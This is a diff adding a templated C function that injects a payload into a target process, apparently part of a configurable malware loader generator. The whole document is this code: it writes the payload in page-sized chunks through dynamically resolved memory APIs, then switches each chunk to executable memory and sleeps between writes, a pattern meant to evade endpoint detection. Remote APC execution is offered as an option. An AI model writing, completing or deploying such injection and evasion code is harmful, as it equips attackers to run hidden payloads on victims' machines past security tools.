@@ -1,0 +1,53 @@
+void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char* payload, SIZE_T payload_len) {
+    SIZE_T offset = 0;
+    SIZE_T pageSize = 0x1000;
+    ULONG oldProt;
+    
+    DEBUG_PRINT("DripWriter: Starting chunked injection loop...");
+
+    while (offset < payload_len) {
+        SIZE_T chunkSize = (payload_len - offset) > pageSize ? pageSize : (payload_len - offset);
+        PVOID chunkAddress = (PBYTE)pBaseAddress + offset;
+        
+        {% if 'driploader' in memory_strategy %}
+            // COMMIT (Reserved Memory)
+            if (hTargetProcess == (HANDLE)-1) {
+                pfnVirtualAlloc(chunkAddress, chunkSize, MEM_COMMIT, PAGE_READWRITE);
+            } 
+            {% if execution_method == 'remoteapc' %}
+            else {
+                pfnVirtualAllocEx(hTargetProcess, chunkAddress, chunkSize, MEM_COMMIT, PAGE_READWRITE);
+            }
+            {% endif %}
+        {% else %}
+            PVOID protAddr = chunkAddress;
+            SIZE_T protSize = chunkSize;
+            pfnNtProtectVirtualMemory(hTargetProcess, &protAddr, &protSize, PAGE_READWRITE, &oldProt);
+        {% endif %}
+
+        if (hTargetProcess == (HANDLE)-1) {
+            pfnRtlMoveMemory(chunkAddress, payload + offset, chunkSize);
+        } else {
+            #ifdef pfnWriteProcessMemory_DEFINED
+            if (pfnWriteProcessMemory) {
+                pfnWriteProcessMemory(hTargetProcess, chunkAddress, payload + offset, chunkSize, NULL);
+            }
+            #else
+            // Should be defined if hTargetProcess != -1 (remoteapc selected)
+            // But for safety in template expansion:
+            {% if execution_method == 'remoteapc' %}
+            pfnWriteProcessMemory(hTargetProcess, chunkAddress, payload + offset, chunkSize, NULL);
+            {% endif %}
+            #endif
+        }
+
+        PVOID protAddr = chunkAddress;
+        SIZE_T protSize = chunkSize;
+        pfnNtProtectVirtualMemory(hTargetProcess, &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);
+
+        pfnSleepEx({{ drip_delay | default(100) }}, FALSE); 
+
+        offset += chunkSize;
+    }
+    DEBUG_PRINT("DripWriter: Injection complete.");
+}
